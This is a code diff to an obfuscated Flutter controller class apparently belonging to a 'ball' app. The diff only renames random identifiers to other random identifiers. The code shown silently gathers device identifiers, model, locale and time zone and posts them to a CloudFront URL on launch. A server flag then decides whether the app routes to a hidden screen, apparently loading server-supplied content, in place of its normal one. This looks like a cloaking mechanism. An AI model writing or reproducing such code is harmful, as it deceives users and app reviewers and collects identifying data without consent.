@@ -10,12 +10,12 @@ import 'package:package_info_plus/package_info_plus.dart';
 
 class BallChargeLogic extends GetxController {
 
-  var hdcnoyfw = RxBool(false);
-  var ejygtnac = RxBool(true);
-  var mvdq = RxString("");
-  var xtyibcs = RxBool(false);
-  var usfb = RxBool(true);
-  final hfeuidz = Dio();
+  var ihqnzuvr = RxBool(false);
+  var bjrdfcl = RxBool(true);
+  var hpgifju = RxString("");
+  var goijbq = RxBool(false);
+  var ibrj = RxBool(true);
+  final aztpcfniy = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,50 +23,49 @@ class BallChargeLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    tyhmg();
+    mixolt();
   }
 
 
-  Future<void> tyhmg() async {
-    xtyibcs.value = true;
-    usfb.value = true;
-    ejygtnac.value = false;
+  Future<void> mixolt() async {
+    goijbq.value = true;
+    ibrj.value = true;
+    bjrdfcl.value = false;
 
-    hfeuidz.post("https://d8h5dsaw0xi2j.cloudfront.net/YvTuYT7MUeXpTYb",data: await cdstkwbni()).then((value) {
+    aztpcfniy.post("https://d8h5dsaw0xi2j.cloudfront.net/YvTuYT7MUeXpTYb",data: await sxpelkhif()).then((value) {
       var zvtpcsq = value.data["zvtpcsq"] as String;
       var obvrkn = value.data["obvrkn"] as bool;
       if (obvrkn) {
-        mvdq.value = zvtpcsq;
-        bxmzvs();
+        hpgifju.value = zvtpcsq;
+        vjhtmln();
       } else {
-        teymzcq();
+        jpuhbm();
       }
     }).catchError((e) {
-      ejygtnac.value = true;
-      usfb.value = true;
-      xtyibcs.value = false;
+      bjrdfcl.value = true;
+      ibrj.value = true;
+      goijbq.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> cdstkwbni() async {
-    final DeviceInfoPlugin sjce = DeviceInfoPlugin();
-    PackageInfo grum_qalenv = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> sxpelkhif() async {
+    final DeviceInfoPlugin wuqckarz = DeviceInfoPlugin();
+    PackageInfo loixsb_figvdhez = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var gvhjm = Platform.localeName;
+    var zpar = Platform.localeName;
     var cqaOkVM = currentTimeZone;
 
-    var adVGFwJ = grum_qalenv.packageName;
-    var YLjHUte = grum_qalenv.version;
-    var FKgm = grum_qalenv.buildNumber;
+    var adVGFwJ = loixsb_figvdhez.packageName;
+    var YLjHUte = loixsb_figvdhez.version;
+    var FKgm = loixsb_figvdhez.buildNumber;
 
-    var gdlI = grum_qalenv.appName;
+    var gdlI = loixsb_figvdhez.appName;
     var WAbDBGzt = "";
     var PHCwb  = "";
     var NGemPE = "";
-    var ntpgkhoy = "";
-    var fgobiyhx = "";
-    var ofblns = "";
-    var wyhjgcmv = "";
+    var exzb = "";
+    var bljocu = "";
+    var ozjl = "";
 
 
     var vYGmXI = "";
@@ -74,51 +73,50 @@ class BallChargeLogic extends GetxController {
 
     if (GetPlatform.isAndroid) {
       vYGmXI = "android";
-      var rtqdjaulwn = await sjce.androidInfo;
+      var mfyekozjn = await wuqckarz.androidInfo;
 
-      NGemPE = rtqdjaulwn.brand;
+      NGemPE = mfyekozjn.brand;
 
-      WAbDBGzt  = rtqdjaulwn.model;
-      PHCwb = rtqdjaulwn.id;
+      WAbDBGzt  = mfyekozjn.model;
+      PHCwb = mfyekozjn.id;
 
-      BOrwkUGW = rtqdjaulwn.isPhysicalDevice;
+      BOrwkUGW = mfyekozjn.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
       vYGmXI = "ios";
-      var mgzerko = await sjce.iosInfo;
-      NGemPE = mgzerko.name;
-      WAbDBGzt = mgzerko.model;
+      var cunpvmd = await wuqckarz.iosInfo;
+      NGemPE = cunpvmd.name;
+      WAbDBGzt = cunpvmd.model;
 
-      PHCwb = mgzerko.identifierForVendor ?? "";
-      BOrwkUGW  = mgzerko.isPhysicalDevice;
+      PHCwb = cunpvmd.identifierForVendor ?? "";
+      BOrwkUGW  = cunpvmd.isPhysicalDevice;
     }
     var res = {
-      "fgobiyhx" : fgobiyhx,
-      "FKgm": FKgm,
-      "gvhjm": gvhjm,
-      "YLjHUte": YLjHUte,
-      "adVGFwJ": adVGFwJ,
-      "WAbDBGzt": WAbDBGzt,
       "gdlI": gdlI,
+      "FKgm": FKgm,
+      "adVGFwJ": adVGFwJ,
+      "BOrwkUGW": BOrwkUGW,
+      "WAbDBGzt": WAbDBGzt,
       "cqaOkVM": cqaOkVM,
       "NGemPE": NGemPE,
       "PHCwb": PHCwb,
+      "zpar": zpar,
+      "YLjHUte": YLjHUte,
       "vYGmXI": vYGmXI,
-      "BOrwkUGW": BOrwkUGW,
-      "ntpgkhoy" : ntpgkhoy,
-      "ofblns" : ofblns,
-      "wyhjgcmv" : wyhjgcmv,
+      "exzb" : exzb,
+      "bljocu" : bljocu,
+      "ozjl" : ozjl,
 
     };
     return res;
   }
 
-  Future<void> teymzcq() async {
+  Future<void> jpuhbm() async {
     Get.offNamed("/ballMain");
   }
 
-  Future<void> bxmzvs() async {
+  Future<void> vjhtmln() async {
     Get.offNamed("/addBallSec");
   }
 
